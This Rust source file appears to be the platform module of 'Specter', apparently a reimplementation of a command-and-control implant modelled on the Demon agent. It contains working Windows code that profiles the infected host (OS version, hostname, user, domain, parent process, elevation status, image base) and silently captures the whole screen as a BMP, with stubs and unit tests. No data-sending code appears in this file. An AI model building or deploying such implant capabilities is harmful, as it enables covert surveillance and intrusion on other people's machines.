//! Platform-specific implementations for Specter.
//!
//! Provides OS metadata collection via native APIs on Windows and stub
//! implementations on other platforms (used during cross-compile testing).

// ─── Windows ─────────────────────────────────────────────────────────────────

#[cfg(windows)]
#[allow(unsafe_code)]
mod imp {
    use std::mem;

    use windows_sys::Wdk::System::SystemServices::RtlGetVersion;
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::Security::{
        GetTokenInformation, TOKEN_ELEVATION, TOKEN_QUERY, TokenElevation,
    };
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW,
        TH32CS_SNAPPROCESS,
    };
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
    use windows_sys::Win32::System::SystemInformation::{
        ComputerNameDnsDomain, ComputerNameDnsHostname, GetComputerNameExW, OSVERSIONINFOEXW,
    };
    use windows_sys::Win32::System::Threading::{
        GetCurrentProcess, GetCurrentProcessId, GetCurrentThreadId, OpenProcessToken,
    };

    /// Query the OS version via `RtlGetVersion` (kernel-level, not spoofable by
    /// compatibility shims unlike `GetVersionEx`).
    ///
    /// Returns `(major, minor, build, service_pack_major)`.
    pub fn os_version() -> (u32, u32, u32, u16) {
        // SAFETY: OSVERSIONINFOEXW is a plain C struct; zeroing is safe and required by the API.
        let mut info: OSVERSIONINFOEXW = unsafe { mem::zeroed() };
        info.dwOSVersionInfoSize = mem::size_of::<OSVERSIONINFOEXW>() as u32;
        // SAFETY: RtlGetVersion always succeeds for this struct size on Windows 2000+.
        unsafe {
            RtlGetVersion(&mut info as *mut OSVERSIONINFOEXW as *mut _);
        }
        (info.dwMajorVersion, info.dwMinorVersion, info.dwBuildNumber, info.wServicePackMajor)
    }

    /// Query the DNS hostname via `GetComputerNameExW`.
    ///
    /// Falls back to the `COMPUTERNAME` environment variable on API failure.
    pub fn hostname() -> String {
        let mut size: u32 = 256;
        let mut buf = vec![0u16; size as usize];
        // SAFETY: buf is allocated above with `size` elements; pointers are valid for the call.
        let ok =
            unsafe { GetComputerNameExW(ComputerNameDnsHostname, buf.as_mut_ptr(), &mut size) };
        if ok != 0 && size > 0 {
            String::from_utf16_lossy(&buf[..size as usize])
        } else {
            std::env::var("COMPUTERNAME").unwrap_or_else(|_| String::from("unknown"))
        }
    }

    /// Return the username from the `USERNAME` environment variable.
    ///
    /// `GetUserNameW` lives in `Secur32.lib`/`Advapi32.lib` which requires extra
    /// link flags; env var is equivalent for a scaffold.
    pub fn username() -> String {
        std::env::var("USERNAME").unwrap_or_else(|_| String::from("unknown"))
    }

    /// Return the DNS domain name of the machine, or `"WORKGROUP"` if not
    /// joined to a domain.
    ///
    /// Uses `GetComputerNameExW(ComputerNameDnsDomain)` which returns an empty
    /// string for workgroup-only machines.
    pub fn domain_name() -> String {
        let mut size: u32 = 256;
        let mut buf = vec![0u16; size as usize];
        // SAFETY: buf is allocated with `size` elements; pointers are valid for the call.
        let ok = unsafe { GetComputerNameExW(ComputerNameDnsDomain, buf.as_mut_ptr(), &mut size) };
        if ok != 0 && size > 0 {
            String::from_utf16_lossy(&buf[..size as usize])
        } else {
            String::from("WORKGROUP")
        }
    }

    /// Return the thread ID of the calling thread via `GetCurrentThreadId`.
    pub fn process_tid() -> u32 {
        // SAFETY: GetCurrentThreadId has no preconditions and always succeeds.
        unsafe { GetCurrentThreadId() }
    }

    /// Return the parent process ID of the current process.
    ///
    /// Enumerates the process list via `CreateToolhelp32Snapshot` and finds the
    /// entry whose PID matches the current process, returning its parent PID.
    /// Returns 0 on any failure.
    pub fn process_ppid() -> u32 {
        // SAFETY: CreateToolhelp32Snapshot, Process32FirstW/NextW, and CloseHandle
        // are safe to call with the arguments provided; the PROCESSENTRY32W struct
        // is zeroed before use as required by the API contract.
        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snapshot == INVALID_HANDLE_VALUE {
                return 0;
            }

            let current_pid = GetCurrentProcessId();
            let mut entry: PROCESSENTRY32W = mem::zeroed();
            entry.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;

            let mut ppid = 0u32;
            if Process32FirstW(snapshot, &mut entry) != 0 {
                loop {
                    if entry.th32ProcessID == current_pid {
                        ppid = entry.th32ParentProcessID;
                        break;
                    }
                    if Process32NextW(snapshot, &mut entry) == 0 {
                        break;
                    }
                }
            }

            CloseHandle(snapshot);
            ppid
        }
    }

    /// Return whether the current process token carries elevated privileges.
    ///
    /// Opens the current process token and queries `TokenElevation`. Returns
    /// `false` on any API failure.
    pub fn is_elevated() -> bool {
        // SAFETY: GetCurrentProcess returns a pseudo-handle that does not need
        // to be closed. OpenProcessToken and GetTokenInformation are called with
        // correctly sized structs; the token handle is closed before return.
        unsafe {
            let mut token: *mut core::ffi::c_void = core::ptr::null_mut();
            if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
                return false;
            }

            let mut elevation: TOKEN_ELEVATION = mem::zeroed();
            let mut ret_len = 0u32;
            let ok = GetTokenInformation(
                token,
                TokenElevation,
                &mut elevation as *mut TOKEN_ELEVATION as *mut _,
                mem::size_of::<TOKEN_ELEVATION>() as u32,
                &mut ret_len,
            );
            CloseHandle(token);
            ok != 0 && elevation.TokenIsElevated != 0
        }
    }

    /// Return the base address of the current process image.
    ///
    /// Calls `GetModuleHandleW(NULL)` which returns the `HMODULE` (load address)
    /// of the main executable without incrementing its reference count.
    pub fn base_address() -> u64 {
        // SAFETY: Passing null to GetModuleHandleW is documented to return the
        // base address of the calling process's main module. The returned handle
        // must not be passed to FreeLibrary.
        let handle = unsafe { GetModuleHandleW(std::ptr::null()) };
        handle as u64
    }

    /// Capture a screenshot of all virtual screens using Windows GDI.
    ///
    /// Returns the screenshot as a 24-bit BMP file in memory, matching the
    /// format produced by the original Demon agent's `WinScreenshot()`:
    ///
    /// * `BITMAPFILEHEADER` (14 bytes)
    /// * `BITMAPINFOHEADER` (40 bytes)
    /// * DIB pixel data (24-bit RGB, `BI_RGB` uncompressed)
    ///
    /// Returns `None` if any GDI call fails.
    pub fn capture_screenshot() -> Option<Vec<u8>> {
        use windows_sys::Win32::Graphics::Gdi::{
            BI_RGB, BITMAPINFO, BitBlt, CreateCompatibleDC, CreateDIBSection, DIB_RGB_COLORS,
            DeleteDC, DeleteObject, GetDC, ReleaseDC, SRCCOPY, SelectObject,
        };
        use windows_sys::Win32::UI::WindowsAndMessaging::{
            GetSystemMetrics, SM_CXVIRTUALSCREEN, SM_CYVIRTUALSCREEN, SM_XVIRTUALSCREEN,
            SM_YVIRTUALSCREEN,
        };

        // BITMAPFILEHEADER is 14 bytes: 2 (type) + 4 (size) + 2 (reserved1) +
        // 2 (reserved2) + 4 (offBits).  windows-sys does not expose this struct,
        // so we build it manually.
        const BMP_FILE_HEADER_SIZE: usize = 14;
        const BMP_INFO_HEADER_SIZE: usize = 40; // sizeof(BITMAPINFOHEADER)

        // SAFETY: All GDI calls below follow the documented Win32 API contracts.
        // Each acquired resource (DC, bitmap, memory DC) is released in the
        // cleanup section before returning.
        unsafe {
            // Extent + origin mirror Demon `WinScreenshot`: virtual-screen metrics, not the
            // display DC's current bitmap (invalid + wrong geometry on multi-monitor / some sessions).
            let x = GetSystemMetrics(SM_XVIRTUALSCREEN);
            let y = GetSystemMetrics(SM_YVIRTUALSCREEN);
            let width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
            let height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

            if width <= 0 || height <= 0 {
                return None;
            }

            let h_dc = GetDC(core::ptr::null_mut());
            if h_dc.is_null() {
                return None;
            }

            let result = (|| -> Option<Vec<u8>> {
                // Row stride: each row is padded to a 4-byte boundary.
                #[allow(clippy::cast_sign_loss)]
                let row_stride = (((24 * width + 31) & !31) / 8) as usize;
                #[allow(clippy::cast_sign_loss)]
                let pixel_bytes = row_stride * height as usize;

                let mut bmi: BITMAPINFO = mem::zeroed();
                bmi.bmiHeader.biSize = BMP_INFO_HEADER_SIZE as u32;
                bmi.bmiHeader.biBitCount = 24;
                bmi.bmiHeader.biCompression = BI_RGB;
                bmi.bmiHeader.biPlanes = 1;
                bmi.bmiHeader.biWidth = width;
                bmi.bmiHeader.biHeight = height;

                let h_mem_dc = CreateCompatibleDC(h_dc);
                if h_mem_dc.is_null() {
                    return None;
                }

                let mut bits_ptr: *mut std::ffi::c_void = std::ptr::null_mut();
                let h_bitmap = CreateDIBSection(
                    h_dc,
                    &bmi,
                    DIB_RGB_COLORS,
                    &mut bits_ptr,
                    core::ptr::null_mut(),
                    0,
                );
                if h_bitmap.is_null() || bits_ptr.is_null() {
                    DeleteDC(h_mem_dc);
                    return None;
                }

                let old_obj = SelectObject(h_mem_dc, h_bitmap);
                if old_obj.is_null() {
                    DeleteObject(h_bitmap);
                    DeleteDC(h_mem_dc);
                    return None;
                }

                let blt_ok = BitBlt(h_mem_dc, 0, 0, width, height, h_dc, x, y, SRCCOPY);

                // Build the BMP file in memory.
                let bmp_size = BMP_FILE_HEADER_SIZE + BMP_INFO_HEADER_SIZE + pixel_bytes;
                let mut bmp = Vec::with_capacity(bmp_size);

                // BITMAPFILEHEADER (14 bytes, manually packed).
                let bf_type: u16 = u16::from(b'B') | (u16::from(b'M') << 8);
                bmp.extend_from_slice(&bf_type.to_le_bytes());
                #[allow(clippy::cast_possible_truncation)]
                let bf_size = bmp_size as u32;
                bmp.extend_from_slice(&bf_size.to_le_bytes());
                bmp.extend_from_slice(&0u16.to_le_bytes()); // bfReserved1
                bmp.extend_from_slice(&0u16.to_le_bytes()); // bfReserved2
                #[allow(clippy::cast_possible_truncation)]
                let bf_off_bits = (BMP_FILE_HEADER_SIZE + BMP_INFO_HEADER_SIZE) as u32;
                bmp.extend_from_slice(&bf_off_bits.to_le_bytes());

                // BITMAPINFOHEADER (40 bytes).
                bmp.extend_from_slice(&(BMP_INFO_HEADER_SIZE as u32).to_le_bytes());
                bmp.extend_from_slice(&width.to_le_bytes());
                bmp.extend_from_slice(&height.to_le_bytes());
                bmp.extend_from_slice(&1u16.to_le_bytes()); // biPlanes
                bmp.extend_from_slice(&24u16.to_le_bytes()); // biBitCount
                bmp.extend_from_slice(&BI_RGB.to_le_bytes());
                #[allow(clippy::cast_possible_truncation)]
                let image_size = pixel_bytes as u32;
                bmp.extend_from_slice(&image_size.to_le_bytes()); // biSizeImage
                bmp.extend_from_slice(&0i32.to_le_bytes()); // biXPelsPerMeter
                bmp.extend_from_slice(&0i32.to_le_bytes()); // biYPelsPerMeter
                bmp.extend_from_slice(&0u32.to_le_bytes()); // biClrUsed
                bmp.extend_from_slice(&0u32.to_le_bytes()); // biClrImportant

                // Pixel data — copy from the DIB section.
                if blt_ok != 0 {
                    let pixel_slice =
                        std::slice::from_raw_parts(bits_ptr as *const u8, pixel_bytes);
                    bmp.extend_from_slice(pixel_slice);
                }

                // Cleanup GDI objects.
                SelectObject(h_mem_dc, old_obj);
                DeleteObject(h_bitmap);
                DeleteDC(h_mem_dc);

                if blt_ok != 0 { Some(bmp) } else { None }
            })();

            ReleaseDC(core::ptr::null_mut(), h_dc);
            result
        }
    }
}

// ─── Non-Windows (Linux / macOS — used during cross-compile test builds) ─────

#[cfg(not(windows))]
mod imp {
    /// OS version placeholder for non-Windows builds.
    pub fn os_version() -> (u32, u32, u32, u16) {
        (0, 0, 0, 0)
    }

    /// Hostname from environment (Linux: `HOSTNAME`, Windows: `COMPUTERNAME`).
    pub fn hostname() -> String {
        std::env::var("HOSTNAME")
            .or_else(|_| std::env::var("COMPUTERNAME"))
            .unwrap_or_else(|_| String::from("unknown"))
    }

    /// Username from environment (Linux: `USER`, Windows: `USERNAME`).
    pub fn username() -> String {
        std::env::var("USER")
            .or_else(|_| std::env::var("USERNAME"))
            .unwrap_or_else(|_| String::from("unknown"))
    }

    /// Domain name stub for non-Windows builds.
    pub fn domain_name() -> String {
        String::from("WORKGROUP")
    }

    /// Thread ID stub for non-Windows builds.
    pub fn process_tid() -> u32 {
        0
    }

    /// Parent process ID stub for non-Windows builds.
    pub fn process_ppid() -> u32 {
        0
    }

    /// Elevation stub for non-Windows builds.
    pub fn is_elevated() -> bool {
        false
    }

    /// Base address stub for non-Windows builds.
    pub fn base_address() -> u64 {
        0
    }

    /// Screenshot stub for non-Windows builds — always returns `None`.
    pub fn capture_screenshot() -> Option<Vec<u8>> {
        None
    }
}

// ─── Shared (platform-agnostic) ──────────────────────────────────────────────

/// Return a non-loopback local IPv4 address as a dotted-decimal string.
///
/// Uses a UDP "connect without send" trick: binding to the wildcard address
/// and connecting to a routable destination causes the OS to select the
/// outbound interface via the routing table.  Reading back `local_addr()`
/// reveals the actual source address without transmitting any data.
///
/// Falls back to `"0.0.0.0"` if no suitable interface is found.
pub fn local_ip() -> String {
    use std::net::UdpSocket;
    UdpSocket::bind("0.0.0.0:0")
        .and_then(|s| {
            s.connect("8.8.8.8:80")?;
            s.local_addr()
        })
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|_| String::from("0.0.0.0"))
}

// ─── Public re-exports ────────────────────────────────────────────────────────

pub use imp::{
    base_address, capture_screenshot, domain_name, hostname, is_elevated, os_version, process_ppid,
    process_tid, username,
};

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn os_version_returns_plausible_values() {
        let (major, _minor, _build, _sp) = os_version();
        // On Windows the major version must be >= 10; on Linux/macOS it will be 0.
        if cfg!(windows) {
            assert!(major >= 10, "expected Windows 10+, got major={major}");
        } else {
            // Stub returns (0, 0, 0, 0) on non-Windows.
            assert_eq!(major, 0);
        }
    }

    #[test]
    fn hostname_returns_non_empty_string() {
        // The host running tests must have a resolvable hostname.
        let name = hostname();
        assert!(!name.is_empty(), "hostname must not be empty");
    }

    #[test]
    fn username_returns_non_empty_string() {
        let name = username();
        assert!(!name.is_empty(), "username must not be empty");
    }

    #[test]
    fn domain_name_returns_non_empty_string() {
        // On Windows: either a real domain or "WORKGROUP".
        // On non-Windows stubs: "WORKGROUP".
        let name = domain_name();
        assert!(!name.is_empty(), "domain_name must not be empty");
    }

    #[test]
    fn process_tid_is_nonzero_on_windows() {
        if cfg!(windows) {
            assert_ne!(process_tid(), 0, "TID must be non-zero on Windows");
        } else {
            // Stub returns 0.
            assert_eq!(process_tid(), 0);
        }
    }

    #[test]
    fn process_ppid_is_nonzero_on_windows() {
        if cfg!(windows) {
            // Every process except PID 0 and 4 (System) has a parent.
            assert_ne!(process_ppid(), 0, "PPID must be non-zero on Windows");
        } else {
            assert_eq!(process_ppid(), 0);
        }
    }

    #[test]
    fn base_address_is_nonzero_on_windows() {
        if cfg!(windows) {
            assert_ne!(base_address(), 0, "base address must be non-zero on Windows");
        } else {
            assert_eq!(base_address(), 0);
        }
    }

    #[test]
    fn local_ip_returns_valid_dotted_decimal() {
        let ip = local_ip();
        // Must be parseable as a valid IPv4 or IPv6 address.
        let parsed = ip.parse::<std::net::IpAddr>();
        assert!(parsed.is_ok(), "local_ip '{ip}' is not a valid IP address");
    }

    #[test]
    fn capture_screenshot_returns_bmp_on_windows_none_otherwise() {
        let result = capture_screenshot();
        if cfg!(windows) {
            let bmp = result.expect("screenshot must succeed on Windows");
            // Minimum size: 14 (file header) + 40 (info header) = 54 bytes.
            assert!(bmp.len() >= 54, "BMP must be at least 54 bytes, got {}", bmp.len());
            // BMP magic bytes.
            assert_eq!(bmp[0], b'B');
            assert_eq!(bmp[1], b'M');
            // Verify bfOffBits = 54 (14 + 40).
            let off_bits = u32::from_le_bytes(bmp[10..14].try_into().unwrap());
            assert_eq!(off_bits, 54, "bfOffBits must be 54 for 24-bit BMP");
            // Verify biBitCount = 24.
            let bit_count = u16::from_le_bytes(bmp[28..30].try_into().unwrap());
            assert_eq!(bit_count, 24, "biBitCount must be 24");
        } else {
            assert!(result.is_none(), "screenshot stub must return None on non-Windows");
        }
    }

    #[test]
    fn local_ip_is_not_loopback() {
        let ip = local_ip();
        // On hosts with real network interfaces the routing table should select
        // a non-loopback address.  "0.0.0.0" is acceptable when no interface
        // is available (e.g. a sandboxed CI environment without network).
        if let Ok(addr) = ip.parse::<std::net::IpAddr>() {
            assert!(
                !addr.is_loopback() || ip == "0.0.0.0",
                "local_ip returned loopback address {ip}"
            );
        }
    }
}
